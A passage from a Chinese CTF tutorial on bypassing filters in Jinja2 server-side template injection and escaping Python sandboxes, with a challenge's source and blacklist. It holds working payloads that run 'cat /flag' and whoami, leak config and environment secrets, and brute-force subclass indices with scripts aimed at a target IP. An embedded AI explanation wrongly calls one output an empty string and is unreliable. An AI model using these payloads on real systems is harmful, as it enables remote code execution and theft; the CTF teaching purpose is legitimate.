(request.cookies.c).read()}} cookie：a=os;b=popen;c=cat /flag {{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}} cookie:a=__globals__;b=cat /flag 引号内十六进制绕过 {{\"\".__class__}} {{\"\"[\"\\x5f\\x5fclass\\x5f\\x5f\" _`是`\\x5f`，`.`是`\\x2E \" ’ chr等被过滤，无法引入字符串 直接拼接键名 dict(buil=aa,tins=dd)|join() 利用 string 、 pop 、 list 、 slice 、 first 等过滤器从已有变量里面直接找 (app.__doc__|list()).pop(102)|string() 构造出 % 和 c 后，用格式化字符串代替 chr {%set udl=dict(a=pc,c=c).values()|join %} # uld=%c {%set i1=dict(a=i1,c=udl%(99)).values()|join %} 过滤数字 例如web370 就想办法构造出数字 ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set coun=(cc~cccc)|int%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccc cc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%} {%print(x.open(file).read())%} 使用 Jinja2 过滤器绕过 在 JinJa2 中内置了很多过滤器，变量可以通过过滤器进行修改，过滤器与变量之间用管道符号|隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号|连接多个过滤器，一个过滤器的输出应用于下一个过滤器。 内置过滤器列表如下： abs() forceescape() map() select() unique() attr() format() max() selectattr() upper() batch() groupby() min() slice() urlencode() capitalize() indent() pprint() sort() urlize() center() int() random() string() wordcount() default() items() reject() striptags() wordwrap() dictsort() join() rejectattr() sum() xmlattr() escape() last() replace() title() filesizeformat() length() reverse() tojson() first() list() round() trim() float() lower() safe() truncate() 其中常见过滤器用法如下： abs() 返回参数的绝对值。 attr() 获取对象的属性。foo|attr(“bar”) 等价于 foo.bar capitalize() 第一个字符大写，所有其他字符小写。 first() 返回序列的第一项。 float() 将值转换为浮点数。如果转换不起作用将返回 0.0。 int() 将值转换为整数。如果转换不起作用将返回 0。 items() 返回一个迭代器(key, value)映射项。 其他用法详见官方文档： Template Designer Documentation - Jinja Documentation (3.2.x) 使用过滤器构造Payload，一般思路是利用这些过滤器，逐步拼接出需要的字符、数字或字符串。对于一般原始字符的获取方法有以下几种： {% set org = ({ }|select()|string()) %}{{org}} # &lt;generator object select_or_reject at 0x0000020B2CA4EA20&gt; {% set org = (self|string()) %}{{org}} # &lt;TemplateReference None&gt; {% set org = self|string|urlencode %}{{org}} # %3CTemplateReference%20None%3E {% set org = (app.__doc__|string) %}{{org}} # Hello The default undefined type. This undefined type can be printed and # iterated over, but every other access will raise an :exc:`UndefinedError`: # # &gt;&gt;&gt; foo = Undefined(name='foo') # &gt;&gt;&gt; str(foo) # '' # &gt;&gt;&gt; not foo # True # &gt;&gt;&gt; foo + 42 # Traceback (most recent call last): # ... # jinja2.exceptions.UndefinedError: 'foo' is undefined {% set num = (self|int) %}{{num}} # 0 {% set num = (self|string|length) %}{{num}} # 24 {% set point = self|float|string|min %}{{point}} # . 通过以上几种Payload，返回的字符串中包含尖括号、字母、空格、下划线、数字、空格、百分号、点号。 我们的目标就是使用这些返回的字符串，结合各种过滤器，拼接出最终的Payload。 GPT代码解释 这段代码是使用Jinja2模板语言的语法。让我逐步解释它的含义： 1. `{% set org = ... %}`: 这是Jinja2的赋值语句。它创建了一个名为\"org\"的变量，并将其赋值为接下来表达式的结果。 2. `({ }|select()|string())`: 这是一个表达式，由几个操作符组成。 - `{ }`：这是一个空的字典对象。 - `select()`：这是Jinja2的过滤器(filter)函数之一。`select()`函数用于选择字典中的项，但在这个例子中，字典是空的，所以它实际上没有进行任何选择。 - `string()`：这是Jinja2的过滤器函数之一。`string()`函数将其输入转换为字符串类型。 3. `{{org}}`: 这是Jinja2的输出表达式。它会在模板中显示变量\"org\"的值。 综上所述，这段代码的作用是创建一个名为\"org\"的变量，并将其赋值为空字典经过选择和字符串转换后的结果。然后，它将\"org\"的值输出到模板中。由于选择和字符串转换操作并未改变空字典的内容，因此最终输出的结果将是一个空字符串。 实战演示 [2020 DASCTF 八月安恒月赛]ezflask 题目源码： #!/usr/bin/env python # -*- coding: utf-8 -*- from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory app = Flask(__name__) @app.route(\"/\") def index(): def safe_jinja(s): blacklist = ['class', 'attr', 'mro', 'base', 'request', 'session', '+', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', '[', ']', '\\'', '\"', '{}'] flag = True for no in blacklist: if no.lower() in s.lower(): flag = False break return flag if not request.args.get('name'): return open(__file__).read() elif safe_jinja(request.args.get('name')): name = request.args.get('name') else: name = 'wendell' template = ''' &lt;div class=\"center-content\"&gt; &lt;p&gt;Hello, %s&lt;/p&gt; &lt;/div&gt; &lt;!--flag in /flag--&gt; &lt;!--python3.8--&gt; ''' % (name) return render_template_string(template) if __name__ == \"__main__\": app.run(host='0.0.0.0', port=5000) 可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。 在存在ssti的地方执行如下payload： {% set org = ({ }|select()|string()) %}{{org}} # 或 {% set org = ({ }|select|string) %}{{org}} 可以看到，我们得到了一段字符串：&lt;generator object select_or_reject at 0x7f06771f4150&gt;，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 &lt;generator object select_or_reject at 0x7f06771f4150&gt; 这个字符串中取到我们想要的字符，从而绕过过滤。 然后我们在使用list()过滤器将字符串转化为列表： {% set orglst = ({ }|select|string|list) %}{{orglst}} 如上图所示，反回了一个列表，列表中是 &lt;generator object select_or_reject at 0x7f06771f4150&gt; 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 _： {% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}} # _ 同理还能取到更多的字符： {% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}} # 空格 {% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}} # _ {% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}} # 0 {% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}} # 7 ...... 这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例： {% set zero = (({ }|select|string|list).pop(38)|int) %} # 0 {% set one = (zero**zero)|int %}{{one}} # 1 {%set two = (zero-one-one)|abs %} # 2 {%set three = (zero-one-one-one)|abs %} # 3 {% set five = (two*two*two)-one-one-one %} # 5 # {%set four = (one+three) %} 注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了 ...... 通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串： # 首先构造出所需的数字: {% set zero = (({ }|select|string|list).pop(38)|int) %} # 0 {% set one = (zero**zero)|int %} # 1 {% set two = (zero-one-one)|abs %} # 2 {% set four = (two*two)|int %} # 4 {% set five = (two*two*two)-one-one-one %} # 5 {% set seven = (zero-one-one-five)|abs %} # 7 # 构造出所需的各种字符与字符串: {% set xhx = (({ }|select|string|list).pop(24)|string) %} # _ {% set space = (({ }|select|string|list).pop(10)|string) %} # 空格 {% set point = ((app.__doc__|string|list).pop(26)|string) %} # . {% set yin = ((app.__doc__|string|list).pop(195)|string) %} # 单引号 ' {% set left = ((app.__doc__|string|list).pop(189)|string) %} # 左括号 ( {% set right = ((app.__doc__|string|list).pop(200)|string) %} # 右括号 ) {% set c = dict(c=aa)|reverse|first %} # 字符 c {% set bfh = self|string|urlencode|first %} # 百分号 % {% set bfhc=bfh~c %} # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接 {% set slas = bfhc%((four~seven)|int) %} # 使用%c构造斜杠 / {% set but = dict(buil=aa,tins=dd)|join %} # builtins {% set imp = dict(imp=aa,ort=dd)|join %} # import {% set pon = dict(po=aa,pen=dd)|join %} # popen {% set os = dict(o=aa,s=dd)|join %} # os {% set ca = dict(ca=aa,t=dd)|join %} # cat {% set flg = dict(fl=aa,ag=dd)|join %} # flag {% set ev = dict(ev=aa,al=dd)|join %} # eval {% set red = dict(re=aa,ad=dd)|join %} # read {% set bul = xhx*2~but~xhx*2 %} # __builtins__ 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read()： {% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %} 如上图所示，成功构造出了 __import__('os').popen('cat /flag').read() 。 然后将上面构造的各种变量添加到SSTI万能payload里面就行了： {% for f,v in whoami.__init__.__globals__.items() %} # globals {% if f == bul %} {% for a,b in v.items() %} # builtins {% if a == ev %} # eval {{b(pld)}} # eval(\"__import__('os').popen('cat /flag').read()\") {% endif %} {% endfor %} {% endif %} {% endfor %} 所以最终的payload为： {% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %} 参考：https://xz.aliyun.com/t/9584 2.6 一些姿势 1. config {{config}} 可以获取当前设置，如果题目类似 app.config ['FLAG'] = os.environ.pop（'FLAG'） ，那可以直接访问 {{config['FLAG']}} 或者 {{config.FLAG}} 得到flag 2. self {{self}} ⇒ &lt;TemplateReference None&gt; {{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config 3. “” 、 [] 、 () 等数据结构 主要目的是配合 __class__.__mro__[2] 这样找到 object 类 {{[].__class__.__base__.__subclasses__() [68].__init__.__globals__['os'].__dict__.environ['FLAG'] 4、url_for, g, request, namespace, lipsum, range, session, dict,get_flashed_messages, cycler, joiner, config等 如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app 等）。 例如： {{url_for.__globals__['current_app'].config.FLAG}} {{get_flashed_messages.__globals__['current_app'].config.FLAG}} {{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncode r.default.__globals__['current_app'].config['FLAG']}} 5. 在URL执行py命令格式 {%这是内容%} eg: {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__=='file' %} {{ c(\"/etc/passwd\").readlines() }} {% endif %} {% endfor %} 2.7 常用到的payload name={{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}} //132是os模块 name={{ config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() }} //大佬经常用的config直接出 在导入不了具体哪个子类例如132的时候，可以用__bulit__重新导入Os模块然后进行命令执行 name={{x.__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"cat /flag\").read()')}} 当然如果遇到过了了敏感字符，记得自己去拼接一下 注入顺序：先找到一个类型所属的对象–&gt;在找到这个对象所继承的基类–&gt;他的功能是谁传授给他的(‘找到他父亲’)–&gt;他父亲除了有这个子类，还有其他的子类呗，这里的类，就包括很多的方法了，比如我们最需要用到的就是，OS模块来命令执行–&gt;找到OS类了，将这个类初始化成方法，相当于我们调用了OS模块–&gt;通过globals保存对全局变量的引用，然后再用OS模块进行命令执行 SSTI常用的语句格式 {{5*5}} 直接执行 {% set a=\"test\" %}{{a}} //设置变量 {% for i in ['t ','e ','s ','t '] %}{{i}}{%endfor%} //执行循环 --&gt;别忘了中间那个{{i}} {% if 25==5*5 %}{{\"success\"}}{% endif %} //条件执行 绕过SSTI过滤 再读了一部分的文章，再结合自己的做题情况来看，对SSTI考点总结如下： 1.过滤一些字符–&gt;绕过即可 2.寻找模块进行命令执行 主要是对第一个过滤的考察，比如说：对字符串进行拼接绕过，编码绕过，format、char等绕过拼接，通过getattribute等函数替代符号的效果,通过request的方法进行传参，通过%set的方法 我们知道在SSTI中用到的符号无非就是： . __ () [] ‘’ 五种 符号的过滤 访问变量属性： . [] getattribute 标准的python语法使用点（.）外，还可以使用中括号（[]）来访问变量的属性,也可以使用attr来访问变量的属性。 过滤了点号 {{().__class__ }}等同于{{()['__class__']}} \"\"|attr(\"__class__\") 相当于 \"\".__class__ 过滤了中括号 还有一些其他的访问方法：pop get getitem: {{url_for.__globals__['__builtins__']}} {{url_for.__globals__.__getitem__('__builtins__')}} {{url_for.__globals__.pop('__builtins__')}} {{url_for.__globals__.get('__builtins__')}} {{url_for.__globals__.setdefault('__builtins__')}} {{\"\".class}}=={{\"\"[[cla,ss]|join]}} //这是拼接绕过 \"__cladd__\"|replace(\"dd\",\"ss\") // \"__class__\" //这是替代 “ssalc”[::-1] \"\"[\"__ssalc__\"][::-1] \"\".__getattribute__(\"__ssalc__\"[::-1]) //这是反转 \"\"[\"__CLASS__\".lower()] //这是大小写转换 \"__class__\"==\"\\x5f\\x5fclass\\x5f\\x5f\"==\"\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\" 对于python2的话，还可以利用base64进行绕过 \"__class__\"==(\"X19jbGFzc19f\").decode(\"base64\") //这是编码绕过 2.8 脚本 1. 寻找内建函数 eval 执行命令 import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__['__builtins__']}}\" res = requests.get(url=url, headers=headers) if 'eval' in res.text: print(i) # 得到一大堆子类的索引: 我们可以记下几个含有eval函数的类： warnings.catch_warnings WarningMessage codecs.IncrementalEncoder codecs.IncrementalDecoder codecs.StreamReaderWriter os._wrap_close reprlib.Repr weakref.finalize ...... 2. 寻找 os 模块执行命令 Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。 首先编写脚本遍历目标Python环境中含有os模块的类的索引号： import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'os.py' in res.text: print(i) # 可以得到一大堆类 但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。 我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 os._wrap_close，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。 3. 寻找 popen 函数执行命令 首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号： import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'popen' in res.text: print(i) # 得到编号为 这样得到的索引还是很准确的。 除了这种方法外，我们还可以直接导入os模块，python有一个importlib类，可用load_module来导入你需要的模块。 4. 寻找 importlib 类执行命令 Python 中存在 &lt;class '_frozen_importlib.BuiltinImporter'&gt; 类，目的就是提供 Python 中 import 语句的实现（以及 __import__ 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。 首先编写脚本遍历目标Python环境中 importlib 类的索引号： import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"]}}\" res = requests.get(url=url, headers=headers) if '_frozen_importlib.BuiltinImporter' in res.text: print(i) 5. 寻找 linecache 函数执行命令 linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。 首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号： import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'linecache' in res.text: print(i) 6. 寻找 subprocess.Popen 类执行命令 从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。 subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。 首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号： import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"]}}\" res = requests.get(url=url, headers=headers) if 'linecache' in res.text: print(i) 四、沙箱逃逸 4.1 原理 沙盒/沙箱 沙箱在早期主要用于测试可疑软件，测试病毒危害程度等等。在沙箱中运行，即使病毒对其造成了严重 危害，也不会威胁到真实环境，沙箱重构也十分便捷。有点类似虚拟机的利用。 沙箱逃逸,就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到shell权限的过程。其 实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。而我们这里主要讲解的是python环境下的 沙箱逃逸。 python的沙箱逃逸就是在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程。 既然是想getshell，或者说是执行命令就需要一个可执行命令的包。可直接执行命令的模块有 os pty subprocess plarform commands 有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块： file open codecs fileinput 不过其中file只在python2中执行，左2右3。 4.2 函数导入限制和绕过 1. import 一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。 import re,sys pattern = re.compile('import\\s+(os|subprocess)') match = re.search(pattern,sys.args[1]) if match: print \"forbidden module import detected\" raise Exception 这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如 __import__ importlib 还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用 &gt;&gt;&gt; import base64 &gt;&gt;&gt; base64.b64encode(\"os\") 'b3M=' &gt;&gt;&gt; flag = __import__(base64.b64decode('b3M=')) &gt;&gt;&gt; flag.system('whoami') misaki\\user 或者 &gt;&gt;&gt; import importlib &gt;&gt;&gt; flag = importlib.import_module('b3M='.decode('base64')) &gt;&gt;&gt; flag.system('whoami') misaki\\user 或者使用字符串拼接的方式 &gt;&gt;&gt; __import__('o'+'s').system('who'+'ami') 字符串f翻转截取 &gt;&gt;&gt; __import__('so'[::-1]).system('whoami') misaki\\user &gt;&gt;&gt; exec(')\"imaohw\"(metsys.so ;so tropmi'[::-1]) misaki\\user 再万一，他是这么禁止的 import re,sys pattern = re.compile('import') match = re.search(pattern,sys.args[1]) if match: print \"forbidden module import detected\" raise Exception 这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。 使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile &gt;&gt;&gt; execfile('/usr/lib/python2.7/os.py') #Linux系统下默认路径 &gt;&gt;&gt; system('whoami') misaki python3可以利用读取文件，配合exec来执行 &gt;&gt;&gt; f = open(r'/usr/lib/python3.6/os.py','r') &gt;&gt;&gt; exec(f.read()) &gt;&gt;&gt; system('whoami') misaki #不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作 exec(\"open('/usr/lib/python3.6/os.py','r').read()\") 使用with open的形式 &gt;&gt;&gt; with open('/usr/lib/python3.6/os.py','r') as f: ... exec(f.read()) ... &gt;&gt;&gt; system('whoami') misaki 或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。 &gt;&gt;&gt; exec('imp'+'ort'+' '+'os;'+'os.system(\"whoami\")') misaki\\user 这里exec不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。 2. builtins __builtins__即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。比如在python2中 在python3中 所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。 &gt;&gt;&gt; __builtins__.__dict__['exec'](\"print('ok')\") ok 通过内建函数来导入包 &gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami') misaki\\user 万一跟上面一样，禁用了import，当然还可以使用拼接的方式 &gt;&gt;&gt; __builtins__.__dict__['__imp'+'ort__']('os').system('whoami') misaki\\user 如果在__builtins__中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载 reload(__builtin__) 如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。 所以可以直接利用imp模块来导入，python2也可以利用。 &gt;&gt;&gt; import imp &gt;&gt;&gt; imp.reload(__builtins__) &lt;module '__builtin__' (built-in)&gt; 在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.modules['os']='/usr/lib/python3.6/os.py' &gt;&gt;&gt; import os 3. 魔法函数 python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。 先看看几个常用的魔法函数 __class__ 返回调用的类型 class A(): pass a = A() print(a.__class__) #&lt;class '__main__.A'&gt; __mro__ 查看类继承的所有父类，直到object class A: pass class B(A): pass class C(A): pass class D(B, C): pass print(D.__mro__) #(&lt;class '__main__.D'&gt;, &lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class 'object'&gt;) __subclasses__ 获取类的所有子类 class A(object): pass class B(A): pass class C(A): pass print(A.__subclasses__()) #[&lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;] __bases__ 返回所有直接父类组成的元组 class A(object): pass class B(A): pass print(B.__bases__) #(&lt;class '__main__.A'&gt;,) 不返回object类 __init__ 类实例创建之后调用, 对当前对象的实例的一些初始化 class A: def __init__(self): print('ok') a = A() # 输出ok __globals__ 能够返回函数所在模块命名空间的所有变量 class A(object): def __init__(self, a, b): self.a = a self.b = b a.__init__.__globals__ {'A': &lt;class '__main__.A'&gt;, 'a': &lt;__main__.A object at 0x0000000001692390&gt;, 'importlib': &lt;module 'importlib' from 'D:\\anaconda\\lib\\importlib\\__init__.pyc'&gt;, '__builtins__': &lt;module '__builtin__' (built-in)&gt;, 'pattern': &lt;_sre.SRE_Pattern object at 0x0000000001695030&gt;, 'base64': &lt;module 'base64' from 'D:\\anaconda\\lib\\base64.pyc'&gt;, 'sys': &lt;module 'sys' (built-in)&gt;, 'flag': &lt;module 'os' from 'D:\\anaconda\\lib\\os.pyc'&gt;, '__package__': None, 'os': &lt;module 'os' from 'D:\\anaconda\\lib\\os.pyc'&gt;,'__doc__': None, 'match': &lt;_sre.SRE_Match object at 0x00000000039A9B28&gt;} __getattribute__ 当类被调用的时候，无条件进入此函数。 __getattr__ 对象中不存在的属性时调用 class A: def __init__(self): self.name = \"Bob\" def __getattribute__(self,item): print(\"ok\") a = A() a.name #ok, 这时候不管调用什么属性都会返回ok，相当于拦截了属性调用。 def __getattr__(self): print('getattr') a.age #getattr 调用不存在的属性会执行，相当于处理了AttributeError。 4. 类继承使用 尝试利用继承关系来找到object类 \"\".__class__.__bases__ #(&lt;class 'object'&gt;,) 前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。 [].__class__.__bases__ {}.__class__.__bases__ 在object类下去查找所有的子类，然后去查找可利用类，__bases__返回是元组，使用下标获得object类。 \"\".__class__.__bases__[0].__subclasses__() 找到需要使用的类，其中有可以使用的类，在python3中使用 &lt;class 'os._wrap_close'&gt;,&lt;class 'warnings.WarningMessage'&gt; 调用他们 &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[128] &lt;class 'os._wrap_close'&gt; &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[177] &lt;class 'warnings.WarningMessage'&gt; 如果子类过多，不好查找是第几个下标，可以使用如下来标记 for i in enumerate(\"\".__class__.__bases__[0].__subclasses__()): print i 先来读取一下文件，C盘下的win.ini文件 \"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__ 从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。 \"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen'](\"C:\\\\windows\\\\win.ini\").read() #如果这里会报错添加__builtins__ \"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.__builtins__['popen'](\"C:\\\\windows\\\\win.ini\").read() 如果想直接在终端显示出来 \"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen'](\"type C:\\\\windows\\\\win.ini\").read() 在python2中可以使用如下形式读取文件的第一行，在python2中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果。 ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].getline(\"C:\\\\windows\\\\win.ini\",1) 执行命令 &gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].os.system('whoami' )misaki\\user 但是python2如果使用字符串的形式，会报如下错误，因为__bases__获取的并不是object类 &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[59] Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt; IndexError: list index out of range 只需要再去获得一次即可 &gt;&gt;&gt; \"\".__class__.__bases__[0].__bases__[0].__subclasses__()[59] &lt;class 'warnings.WarningMessage'&gt; 5. 特殊函数查找 5.1 python3 在GitHub的python页面上把自带函数全部获取目前的3.8的模块(202) asyncio collections concurrent ctypes curses dbm distutils email encodings ...... warnings.py wave.py weakref.py webbrowser.py xdrlib.py zipapp.py zipfile.py zipimport.py 将这么模块进行筛选，规则这些模块哪些有调用上面提到的模块，或者文件读取等方法。 # coding=UTF-8 import codecs from collections import defaultdict with codecs.open('python.txt', 'r', encoding='UTF-8') as f: modules = f.readlines() modules = [m.strip().replace('.py', '') for m in modules] target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys', 'commands'] target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open', 'codecs'] all_targets = target_modules + target_functions results = defaultdict(list) for m in modules: try: module = __import__(m) except Exception as e: # print('ERROR:', m) pass for t in all_targets: if t in module.__dict__: results[m.encode()].append(t) print(\"可利用模块数量为:\"+str(len(results))) for k, v in results.items(): print(k, v) 筛选完成后有python3两百个模块可能可以利用，然后再利用脚本进一步筛选 find_modules = { } target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys'] target_functions = ['__import__', 